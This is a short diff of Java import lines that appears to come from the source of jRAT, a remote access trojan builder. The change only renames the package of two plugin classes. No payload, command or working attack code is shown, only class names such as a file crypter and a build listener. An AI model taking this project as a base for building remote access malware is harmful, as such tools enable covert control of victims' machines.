@@ -20,10 +20,10 @@ import pro.jrat.Main;
 import pro.jrat.OSConfig;
 import pro.jrat.api.utils.JarUtils;
 import pro.jrat.crypto.FileCrypter;
+import pro.jrat.extensions.ExternalPlugin;
+import pro.jrat.extensions.PluginList;
 import pro.jrat.io.Files;
 import pro.jrat.listeners.BuildListener;
-import pro.jrat.plugins.ExternalPlugin;
-import pro.jrat.plugins.PluginList;
 import pro.jrat.ui.frames.FrameSummary;
 
 import com.redpois0n.common.codec.Base64;
